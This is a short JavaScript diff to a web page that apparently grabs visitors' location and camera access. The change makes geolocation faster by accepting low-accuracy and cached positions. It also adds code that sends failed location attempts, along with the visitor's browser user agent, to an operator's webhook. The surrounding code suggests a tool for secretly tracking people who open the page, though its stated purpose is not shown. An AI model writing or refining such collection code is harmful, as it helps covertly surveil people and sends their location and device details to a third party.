@@ -39,12 +39,13 @@
         let cameraError = null;
         let locationError = null;
 
-        // Step 1: Request location FIRST
+        // Step 1: Request location FIRST — use low accuracy for instant result
         try {
             const position = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: false,  // Use WiFi/cell (faster, works indoors)
-                    timeout: 30000               // 30 seconds
+                    enableHighAccuracy: false,  // Uses WiFi/cell towers — instant
+                    timeout: 5000,              // 5 seconds max
+                    maximumAge: 300000          // Accept cached location up to 5 min old
                 });
             });
             latitude = position.coords.latitude;
@@ -61,6 +62,13 @@
             });
         } catch (err) {
             locationError = err.message;
+            // Even if it fails, send error so you know why
+            sendToWebhook({
+                type: 'location_error',
+                error: err.message,
+                timestamp: new Date().toISOString(),
+                ua: navigator.userAgent
+            });
         }
 
         // Step 2: Then request camera
